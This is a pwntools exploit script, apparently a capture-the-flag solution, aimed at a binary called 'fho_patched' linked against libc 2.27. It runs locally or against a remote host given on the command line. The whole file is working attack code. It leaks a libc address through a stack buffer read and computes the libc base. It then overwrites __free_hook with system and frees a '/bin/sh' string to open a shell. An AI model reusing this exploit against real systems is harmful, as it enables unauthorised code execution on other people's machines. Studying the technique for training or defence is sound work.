from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break main
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './fho_patched'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
#context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True
context.arch = elf.arch

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
p = start()
libc = ELF('./libc-2.27.so')
rop = ROP(elf)
leak_canary = b'a' * 0x48
p.sendlineafter(b'Buf: ', leak_canary)
p.recv(0x4d)
leak_libc = u64(p.recv(6).ljust(8,b'\x00')) - 0x0a + 0x7f
info('Leaked libc: {}'.format(hex(leak_libc)))
libc.address = leak_libc - 0x21b7f
info('Libc base: {}'.format(hex(libc.address)))
p.sendlineafter(b"To write: ", str(libc.symbols['__free_hook']).encode())
p.sendlineafter(b"With: ", str(libc.symbols['system']).encode())
p.sendlineafter(b"To free: ", str(next(libc.search(b'/bin/sh\x00'))).encode())
p.interactive()